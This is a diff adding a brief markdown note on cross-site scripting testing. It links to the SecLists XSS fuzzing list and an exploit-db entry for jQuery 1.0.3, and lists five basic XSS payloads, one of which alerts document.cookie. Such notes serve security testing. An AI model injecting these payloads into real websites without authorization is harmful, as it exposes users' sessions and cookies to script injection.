@@ -1,0 +1,12 @@
+## Extreme
+https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS
+
+# Examples
+<script>alert("XSS1")</script>
+<script>alert('XSS1')</script>
+<body onload=alert(‘something’)>;
+<b onmouseover=alert(‘XSS testing!‘)></b>
+<script>alert(document.cookie)</script>
+
+## Jquery 1.0.3 know xdd
+https://www.exploit-db.com/exploits/49767
